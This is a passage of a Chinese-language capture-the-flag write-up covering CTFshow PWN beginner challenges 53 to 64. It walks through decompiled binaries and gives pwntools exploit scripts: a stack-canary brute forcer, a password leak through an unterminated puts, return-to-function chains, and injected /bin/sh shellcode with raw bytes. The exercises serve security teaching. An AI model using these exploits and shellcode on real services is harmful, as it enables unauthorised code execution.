 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀
    * *************************************
    * Classify: CTFshow --- PWN --- 入门
    * Type  : Stack_Overflow
    * Site  : https://ctf.show/
    * Hint  : Do you know how Canary works?
    * *************************************
How many bytes do you want to write to the buffer?
```

果然报错信息不一样

所以canary函数本身只是检查canary.txt是否存在的

并不需要在意

按照main函数逻辑

canary函数执行后就是ctfshow函数

ctfshow函数代码：

```c
int ctfshow()
{
  size_t nbytes; // [esp+4h] [ebp-54h] BYREF
  _BYTE v2[32]; // [esp+8h] [ebp-50h] BYREF
  _BYTE buf[32]; // [esp+28h] [ebp-30h] BYREF
  int s1; // [esp+48h] [ebp-10h] BYREF
  int v5; // [esp+4Ch] [ebp-Ch]

  v5 = 0;
  s1 = global_canary;
  printf("How many bytes do you want to write to the buffer?\n>");
  while ( v5 <= 31 )
  {
    read(0, &v2[v5], 1u);
    if ( v2[v5] == 10 )
      break;
    ++v5;
  }
  __isoc99_sscanf(v2, "%d", &nbytes);
  printf("$ ");
  read(0, buf, nbytes);
  if ( memcmp(&s1, &global_canary, 4u) )
  {
    puts("Error *** Stack Smashing Detected *** : Canary Value Incorrect!");
    exit(-1);
  }
  puts("Where is the flag?");
  return fflush(stdout);
}
```

这段代码实现了一个简单的用户交互程序，其主要功能是从用户输入中读取数据并写入缓冲区，同时通过“金丝雀值”（canary value）检测是否存在堆栈溢出攻击。以下是代码的详细逻辑分析：

---

### **1. 函数声明**
```c
int ctfshow()
```
- 这是一个无参数的函数，返回值为 `int` 类型。

---

### **2. 局部变量声明**
```c
size_t nbytes; // 用于存储用户输入的字节数
_BYTE v2[32];  // 用于存储用户输入的数字字符串（最多32字节）
_BYTE buf[32]; // 用于存储用户输入的最终数据（最多32字节）
int s1;        // 用于存储全局金丝雀值的副本
int v5;        // 用于循环控制
```

---

### **3. 初始化变量**
```c
v5 = 0;
s1 = global_canary;
```
- `v5` 初始化为 `0`，用于后续循环控制。
- `s1` 被初始化为全局变量 `global_canary` 的值，这是一个“金丝雀值”，用于检测堆栈溢出。

---

### **4. 提示用户输入字节数**
```c
printf("How many bytes do you want to write to the buffer?\n>");
```
- 程序提示用户输入要写入缓冲区的字节数。``

---

### **5. 读取用户输入的数字字符串**
```c
while (v5 <= 31)
{
    read(0, &v2[v5], 1u); // 从标准输入读取一个字节
    if (v2[v5] == 10) // 如果是换行符（回车），结束输入
        break;
    ++v5;
}
__isoc99_sscanf(v2, "%d", &nbytes); // 将输入的字符串转换为整数
```
- 使用 `read` 函数逐字节读取用户输入，直到遇到换行符（`\n`）。
- 最多读取32字节，存储到 `v2` 数组中。
- 使用 `__isoc99_sscanf` 将输入的字符串解析为整数，存储到 `nbytes` 中。

---

### **6. 提示用户输入数据**
```c
printf("$ ");
```
- 程序提示用户输入实际要写入缓冲区的数据。

---

### **7. 读取用户输入的数据**
```c
read(0, buf, nbytes);
```
- 使用 `read` 函数从标准输入读取 `nbytes` 字节的数据，并存储到 `buf` 数组中。

---

### **8. 检测堆栈溢出**
```c
if (memcmp(&s1, &global_canary, 4u))
{
    puts("Error *** Stack Smashing Detected *** : Canary Value Incorrect!");
    exit(-1);
}
```
- 使用 `memcmp` 比较 `s1` 和 `global_canary` 的值。
- 如果它们不相等，说明堆栈可能被破坏（例如，由于缓冲区溢出攻击），程序会输出错误信息并退出。

---

### **9. 输出提示信息**
```c
puts("Where is the flag?");
return fflush(stdout);
```
- 输出提示信息：“Where is the flag?”。
- 使用 `fflush(stdout)` 清空标准输出缓冲区，确保所有内容都被输出。

1. **功能**：程序要求用户输入要写入缓冲区的字节数，然后读取相应数量的数据到缓冲区。同时，通过“金丝雀值”检测堆栈是否被破坏。
2. **安全机制**：
   - 使用金丝雀值（`global_canary`）检测堆栈溢出。
   - 如果用户输入的字节数超过缓冲区大小（32字节），可能会导致缓冲区溢出，但金丝雀值会检测到这种异常。



至此基本上就能写exp了

首要目的是先爆破出carnary的值

carnary的值是4字节

而一字节有8位

所有字节有
$$
2^8=256
$$
种可能

所以通过嵌套循环就可以进行爆破

拷打ai：

```python
from pwn import *
import sys

host = 'pwn.challenge.ctf.show'
port = 28242

canary = b''


def brute_canary():
    global canary
    for i in range(4):
        for guess in range(256):
            io = remote(host, port)
            payload = b'A' * 32  # 填充 buf 数组
            payload += canary  # 已知的 canary 部分
            payload += p8(guess)  # 当前猜测的字节

            try:
                io.sendlineafter(b'>', b'100')
                io.sendafter(b'$ ', payload)
                response = io.recvline(timeout=2)
                io.close()
                if b'Canary Value Incorrect!' not in response:
                    canary += p8(guess)
                    print(
                        f"[+] Found byte {i + 1}: {hex(guess)} (ASCII: {chr(guess) if guess > 0x1f else chr(guess + 0x37)} )")
                    break
            except EOFError:
                io.close()
                continue


if __name__ == "__main__":
    brute_canary()
    print(f"\n[+] Global Canary (HEX): {canary.hex()}")
    print(f"[+] Global Canary (ASCII): {canary.decode('latin-1', errors='replace')}")
```

最终结果：

```python
[+] Global Canary (HEX): 33364421
[+] Global Canary (ASCII): 36D!
```

根据这个canary值编写最终的exp：

```python
from pwn import *
sh = remote("pwn.challenge.ctf.show", 28242)
bin_sh = 0x08048696
canary = b'\x33\x36\x44\x21'
payload = b'a'*(0x20) + canary + b'a'*(0x10) + p32(bin_sh)
#payload = b'a'*(0x20) + canary + p32(0x0)*4 + p32(bin_sh)
sh.sendline("1000")
sh.send(payload)
sh.interactive()
```

payload有两个需要注意的地方

1.因为用户输入的字节数一旦超过缓冲区大小（32字节），会导致缓冲区溢出，金丝雀值会检测到这种异常

所以payload中第一次填充数据只填入了0x20，而不是直接填入buf到栈底的长度0x30

然后接上爆破得出的canary值

再将到栈底的地址给覆盖掉，而剩下需要填入的数据就是0x30-0x20的部分

(另外一种payload也是一样的，本质上都是填充实际为16字节的东西进去覆盖掉到栈底的所有地址)

2.因为有两次输入

所以需要先sendline

这里sendline的意义是自定义一个下一次read的长度(详见4，5)

这样就能拿到flag

```python
[x] Opening connection to pwn.challenge.ctf.show on port 28198
[x] Opening connection to pwn.challenge.ctf.show on port 28198: Trying 124.223.158.81
D:\python\pythonProject\pwn53.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sh.sendline("1000")
[+] Opening connection to pwn.challenge.ctf.show on port 28198: Done
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  

* *************************************

   * Classify: CTFshow --- PWN --- 入门                              
     * Type  : Stack_Overflow                                          
       * Site  : https://ctf.show/                                       
       * Hint  : Do you know how Canary works?                           

* *************************************

How many bytes do you want to write to the buffer?

$ Where is the flag?
ctfshow{df00b40b-c8dd-4822-aed7-20b94cbee460}
```

(不会C不会python不会pwn的菜只能一点点把全部细节贴出来)

## pwn54

32位程序

分析主函数

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s1[64]; // [esp+0h] [ebp-1A0h] BYREF
  char v5[256]; // [esp+40h] [ebp-160h] BYREF
  char s[64]; // [esp+140h] [ebp-60h] BYREF
  FILE *stream; // [esp+180h] [ebp-20h]
  char *v8; // [esp+184h] [ebp-1Ch]
  int *p_argc; // [esp+194h] [ebp-Ch]

  p_argc = &argc;
  setvbuf(stdout, 0, 2, 0);
  memset(s, 0, sizeof(s));
  memset(v5, 0, sizeof(v5));
  memset(s1, 0, sizeof(s1));
  puts("==========CTFshow-LOGIN==========");
  puts("Input your Username:");
  fgets(v5, 256, stdin);
  v8 = strchr(v5, 10);
  if ( v8 )
    *v8 = 0;
  strcat(v5, ",\nInput your Password.");
  stream = fopen("/password.txt", "r");
  if ( !stream )
  {
    puts("/password.txt: No such file or directory.");
    exit(0);
  }
  fgets(s, 64, stream);
  printf("Welcome ");
  puts(v5);
  fgets(s1, 64, stdin);
  v5[0] = 0;
  if ( !strcmp(s1, s) )
  {
    puts("Welcome! Here's what you want:");
    flag();
  }
  else
  {
    puts("You has been banned!");
  }
  return 0;
}
```

简单分析函数逻辑

交互效果就是用户首先输入**username**，**username**依靠**fgets**函数获取，**fgets**函数的好处就在于会限制读取字节数，避免了普通**gets**函数存在的栈溢出风险

但是这里**username**的储存长度设置为256字节，并将其存储于变量**V5**

然后立马接了一个**puts**函数

**puts**函数的特性就是在/x00之前不会停止输出

这里就和前面的变量**V5**有了一定关联

变量**V5**存储的位置为：0x0000000000000160

而后续的密码存储于变量**s**

而**s**的位置是：0x0000000000000060

二者刚好相差**0x100**

而这刚好就是256字节

所以一旦在输入一个长度为256字节的username后，puts函数会输出一个welcome后接上刚刚的username，但如果username里面没空格符和换行符的话，**puts**函数将按照位置继续输出，而256字节后，刚好就是密码所在的字段

所以当输入一个长度为256字节的username时，它的欢迎内容会在后面多跟一段密码

那么exp就很明显了

```python
from pwn import *
p=remote("pwn.challenge.ctf.show",28141)
payload = b'a'*256
p.sendline(payload)
p.interactive()
```

交互结果：

```python
D:\python\pythonProject\.venv\Scripts\python.exe D:\python\pythonProject\pwn54.py 
[x] Opening connection to pwn.challenge.ctf.show on port 28141
[x] Opening connection to pwn.challenge.ctf.show on port 28141: Trying 124.223.158.81
[+] Opening connection to pwn.challenge.ctf.show on port 28141: Done
[*] Switching to interactive mode
==========CTFshow-LOGIN==========
Input your Username:
Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3

You has been banned!
[*] Got EOF while reading in interactive
```

这里的CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3就是最终的用户密码

于是再一次进行交互

```c
C:\Users\26597>nc pwn.challenge.ctf.show 28141
==========CTFshow-LOGIN==========
Input your Username:
a
Welcome a,
Input your Password.
CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3
Welcome! Here's what you want:
ctfshow{cf69bbb6-bc1f-48d4-9a0f-d9595a477f27}
```

## pwn55

checksec

32位

```c
[*] 'C:\\Users\\26597\\Desktop\\pwn附件\\pwn55'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

IDA分析

主函数没东西

进ctfshow函数

里面还是没啥东西

就明摆着一个**gets**函数栈溢出

看函数列表

存在几个很明显提示的函数

**flag_func1,flag_func2,flag**三个函数

一一查看

**flag_func1**：

```python
Elf32_Dyn **flag_func1()
{
  Elf32_Dyn **result; // eax

  result = &GLOBAL_OFFSET_TABLE_;
  flag1 = 1;
  return result;
}
```

**flag_func2**：

```c
Elf32_Dyn **__cdecl flag_func2(int a1)
{
  Elf32_Dyn **result; // eax

  result = &GLOBAL_OFFSET_TABLE_;
  if ( flag1 && a1 == -1397969748 )
  {
    flag2 = 1;
  }
  else if ( flag1 )
  {
    return (Elf32_Dyn **)puts("Try Again.");
  }
  else
  {
    return (Elf32_Dyn **)puts("Try a little bit.");
  }
  return result;
}
```

**flag**:

```C
int __cdecl flag(int a1)
{
  char s[48]; // [esp+Ch] [ebp-3Ch] BYREF
  FILE *stream; // [esp+3Ch] [ebp-Ch]

  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(s, 48, stream);
  if ( flag1 && flag2 && a1 == -1111638595 )
    return printf("%s", s);
  if ( flag1 && flag2 )
    return puts("Incorrect Argument.");
  if ( flag1 || flag2 )
    return puts("Nice Try!");
  return puts("Flag is not here!");
}
```

初略审计，大意就是func1调用，flag1就等于1了，也就为真了

调用func2，此时会检查flag1是否为真，并检查a1是否为对应值

调用flag，此时会检查flag1，flag2是否为真，并检查a1是否为对应值

初略理解至此即可

记录三函数地址，打平字节

```python
payload = flat([b'a'*(0x2c+4),flag1,flag2,flag,-1397969748,-1111638595])
```

完整exp：

```python
import elftools.elf.sections
from pwn import *
p = remote("pwn.challenge.ctf.show",28301)
flag1 = 0x08048586
flag2 = 0x0804859D
flag = 0x08048606
payload = flat([b'a'*(0x2c+4),flag1,flag2,flag,-1397969748,-1111638595])
p.sendline(payload)
p.interactive()
```

```python
D:\python\pythonProject\.venv\Scripts\python.exe D:\python\pythonProject\pwn55.py 
[x] Opening connection to pwn.challenge.ctf.show on port 28301
[x] Opening connection to pwn.challenge.ctf.show on port 28301: Trying 124.223.158.81
[+] Opening connection to pwn.challenge.ctf.show on port 28301: Done
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Stack_Overflow                                          
    * Site  : https://ctf.show/                                       
    * Hint  : Try to find the relationship between flags!             
    * *************************************                           
How to find flag?
Input your flag: ctfshow{3a9e5798-5ee2-4802-909d-42fb5ab55206}
[*] Got EOF while reading in interactive
```

## pwn56

```c
[*] 'C:\\Users\\26597\\Desktop\\pwn附件\\pwn56'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX disabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

IDA分析

就一个函数

```c
void __noreturn start()
{
  int v0; // eax
  char v1[10]; // [esp-Ch] [ebp-Ch] BYREF
  __int16 v2; // [esp-2h] [ebp-2h]

  v2 = 0;
  strcpy(v1, "/bin///sh");
  v0 = sys_execve(v1, 0, 0);
}
```

shellcode说是

实际上shell直接就给了

连上就送了属于是

## pwn57

同上，连上就送，这两题的主要目的还是认识shellcode

## pwn58

checksec

32位

IDA分析

main函数反编译失败，怀疑就是这样设计的（）

就直接将就汇编进行分析

大致的函数顺序就是先logo再ctfshow函数

logo函数一如既往没东西

进ctfshow函数

ctfshow函数只有个gets函数

找遍字段没找到后门

自行传入shellcode即可

```python
from pwn import *
p = remote("pwn.challenge.ctf.show",28305)
shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
p.sendline(shellcode)
p.interactive()
```

## pwn59

64位shellcode

不用像之前的64位传参一样需要找rdi啥的位置

直接传shellcode即可

但是必须加上架构才能打通

```python
from pwn import *
p = remote("pwn.challenge.ctf.show",28125)
context.arch='amd64'
shellcode = asm(shellcraft.sh())
payload = shellcode
p.sendline(payload)
p.interactive()
```

## pwn60

稍难的shellcode

checksec

32位

看main函数

存在一个gets函数和一个strncpy函数

gets函数就很明显的需要进行一个溢出处理

strncpy是把s复制给buf2

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("CTFshow-pwn can u pwn me here!!");
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf("See you ~");
  return 0;
}


```

所以gdb动态调试搞出偏移量

gdb有时会出现没有权限的情况

使用指令

```c
chmod 777 pwn60
```

然后正常调试函数即可

具体调试流程：

```c
ctfshow@ubuntu:~/Desktop/xd$ chmod 777 pwn60
ctfshow@ubuntu:~/Desktop/xd$ gdb pwn60
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 191 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from pwn60...done.
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> r
Starting program: /home/ctfshow/Desktop/xd/pwn60 
CTFshow-pwn can u pwn me here!!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
See you ~
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0x9
 EDX  0xf7fad890 (_IO_stdfile_1_lock) ◂— 0
 EDI  0x0
 ESI  0xf7fac000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c
 EBP  0x62616163 ('caab')
 ESP  0xffffcf30 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 EIP  0x62616164 ('daab')
─────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
Invalid address 0x62616164










─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp  0xffffcf30 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0004│      0xffffcf34 ◂— 'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0008│      0xffffcf38 ◂— 'gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:000c│      0xffffcf3c ◂— 'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0010│      0xffffcf40 ◂— 'iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0014│      0xffffcf44 ◂— 'jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0018│      0xffffcf48 ◂— 'kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
07:001c│      0xffffcf4c ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► f 0 62616164
   f 1 62616165
   f 2 62616166
   f 3 62616167
   f 4 62616168
   f 5 62616169
   f 6 6261616a
   f 7 6261616b
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l
usage: pwn cyclic [-h] [-a alphabet] [-n length] [-c context] [-l lookup_value | count]
pwn cyclic: error: argument -l/-o/--offset/--lookup: expected one argument
pwndbg> cyclic -l 62616164
[CRITICAL] Pattern contains characters not present in the alphabet
pwndbg> cyclic -l 0x62616164
112
```

最后拿到了实际的偏移量

就这样直接打shellcode，用ljust方法补齐buf2字段即可

```python
from pwn import *
context.log_level = 'debug'
p = remote("pwn.challenge.ctf.show", 28291)
e = ELF("./pwn60")
buf2 = e.sym['buf2']
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(112, b'a') + p32(buf2)
p.sendline(payload)
p.interactive()
```

## pwn61

提示看输出

交互

```c
C:\Users\26597>nc pwn.challenge.ctf.show 28225
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀
    * *************************************
    * Classify: CTFshow --- PWN --- 入门
    * Type  : Stack_Overflow
    * Site  : https://ctf.show/
    * Hint  : Use shellcode to get shell!
    * *************************************
Welcome to CTFshow!
What's this : [0x7ffef4fdfd70] ?
Maybe it's useful ! But how to use it?
```

输出了一个莫名其妙的数字

一眼是地址

返回去看main函数

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi
  _QWORD v5[2]; // [rsp+0h] [rbp-10h] BYREF

  v5[0] = 0LL;
  v5[1] = 0LL;
  v3 = _bss_start;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  logo(v3, 0LL);
  puts("Welcome to CTFshow!");
  printf("What's this : [%p] ?\n", v5);
  puts("Maybe it's useful ! But how to use it?");
  gets(v5);
  return 0;
}
```

这里可以看到，这里通过占位符输出的是v5的地址

v5到栈底的位置是0x10

64位程序

所以偏移量就0x10+8

多次交互，发现这个地址位置在变化

所以需要想办法截取这个v5的地址，于是

```python
p.recvuntil("What's this : [")
shellcode_area = eval(p.recvuntil(b"]", drop=True))
```

拿到了v5的地址，就可以对应着传入shellcode了

根据这个方法，写出exp：

```python
from pwn import *
context(arch="amd64",log_level="debug")
p = remote("pwn.challenge.ctf.show",28255)
p.recvuntil("What's this : [")
shellcode_area = eval(p.recvuntil(b"]", drop=True))
offset = 0x10 + 8
print(hex(shellcode_area))
shellcode = asm(shellcraft.sh())
payload = flat([cyclic(offset), shellcode_area, shellcode])
p.sendline(payload)
p.interactive()
```

但是

不出意外是出意外了

打不通

网上找各位佬的文章

发现存在一个问题

shellcode太长，超出了v4,v5的范围

Shellcode 的长度通常会超过 v5 的空间（8 字节）。如果直接覆盖 v5，Shellcode 的部分内容可能会被截断。此外，leave ret 之后，程序可能会跳转到一个无效地址，导致崩溃

去搜索了一下leave

等价于 mov rsp, rbp 和 pop rbp。

它将 rbp 的值赋给 rsp，从而恢复上一个栈帧的栈指针。

然后从栈上弹出 rbp 的值，恢复上一个栈帧的基指针。

所以我们把shellcode写在v5后面就是offset+0x8的位置，因为还有一个返回地址的位置

也就是说，offset+0x8是为了完全填充略过v5的空间，直接往后写

最终exp：

```python
from pwn import *
context(arch="amd64",log_level="debug")
p = remote("pwn.challenge.ctf.show",28255)
p.recvuntil("What's this : [")
shellcode_area = eval(p.recvuntil(b"]", drop=True))
offset = 0x10 + 8
print(hex(shellcode_area))
shellcode = asm(shellcraft.sh())
payload = flat([cyclic(offset), shellcode_area + offset +8, shellcode])
p.sendline(payload)
p.interactive()
```

## pwn62

类似上题

将v5改成了buf

跟进buf，发现

```c
-0000000000000010 // Use data definition commands to manipulate stack variables and arguments.
-0000000000000010 // Frame size: 10; Saved regs: 8; Purge: 0
-0000000000000010
-0000000000000010     _QWORD buf;
-0000000000000008     _QWORD var_8;
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
+0000000000000010
+0000000000000010 // end of stack variables
```

这里可以看到buf实则为8字节



再看main函数

大致情况和上题一致

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi
  _QWORD buf[2]; // [rsp+0h] [rbp-10h] BYREF

  buf[0] = 0LL;
  buf[1] = 0LL;
  v3 = _bss_start;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  logo(v3, 0LL);
  puts("Welcome to CTFshow!");
  printf("What's this : [%p] ?\n", buf);
  puts("Maybe it's useful ! But how to use it?");
  read(0, buf, 0x38uLL);
  return 0;
}
```

0x10+0x8=24字节

选用上题的shellcode的话，shellcode的长度会是48字节

这样在读取buf段内容时，由于只读0x38=56字节的内容

就会导致payload被从中间截断

所以需要传入更短的shellcode

找到一组shellcode

32 位 短字节 shellcode -> 21 字节 \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

64 位 较短的 shellcode -> 23 字节 \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f \x05
23+24+8=55字节

```python
from pwn import *
context(arch="amd64")
p = remote("pwn.challenge.ctf.show",28203)
p.recvuntil("What's this : [")
shellcode_area = eval(p.recvuntil(b"]", drop=True))
offset = 0x10 + 8
print(hex(shellcode_area))
shellcode=b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
# shellcode1 = asm(shellcraft.sh())
# print(len(shellcode1))
# 这里算出来的直接生成的shellcode长度为48，故最后还是得自行输入一个最短shellcode
payload = flat([cyclic(offset), shellcode_area + offset +8 , shellcode])
p.sendline(payload)
p.interactive()
```

## pwn63

题目说是变了，确实又短了一点

但是并不影响上一个的shellcode

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi
  _QWORD buf[2]; // [rsp+0h] [rbp-10h] BYREF

  buf[0] = 0LL;
  buf[1] = 0LL;
  v3 = _bss_start;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  logo(v3, 0LL);
  puts("Welcome to CTFshow!");
  printf("What's this : [%p] ?\n", buf);
  puts("Maybe it's useful ! But how to use it?");
  read(0, buf, 0x37uLL);
  return 0;
}
```

就短了0x1

也就是只能输入55字节

而之前的shellcode传进去刚好55字节

直接照搬exp就能出

```python
from pwn import *
context(arch="amd64")
p = remote("pwn.challenge.ctf.show",28209)
p.recvuntil("What's this : [")
shellcode_area = eval(p.recvuntil(b"]", drop=True))
offset = 0x10 + 8
print(hex(shellcode_area))
shellcode=b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
# shellcode1 = asm(shellcraft.sh())
# print(len(shellcode1))

payload = flat([cyclic(offset), shellcode_area + offset +8 , shellcode])
p.sendline(payload)
p.interactive()
```

## pwn64

32位，开了栈不可执行

```pwnershell
C:\Users\26597\Desktop\pwn附件>checksec pwn64
[*] 'C:\\Users\\26597\\Desktop\\pwn附件\\pwn64'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

进入IDA分析

main函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf; // [esp+8h] [ebp-10h]

  buf = mmap(0, 0x400u, 7, 34, 0, 0);
  alarm(0xAu);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  puts("Some different!");
  if ( read(0, buf, 0x400u) < 0 )
  {
    puts("Illegal entry!");
    exit(1);
  }
  ((void (*)(void))buf)();
  return 0;
}
```

 buf = mmap(0, 0x400u, 7, 34, 0, 0);

这里给到buf的权限值为7

也就是可读可写可执行

那就爽了

虽然栈不可执行，但是buf可读可写可执行

写个shellcode传入buf就好了

32位，exp：

```python
from pwn import *
p = remote("pwn.challenge.ctf.show" ,28170)
payload = asm(shellcraft.sh())
p.sendline(payload)
p.interactive()


# from pwn import *
# p = remote("pwn.challenge.ctf.show" ,28170)
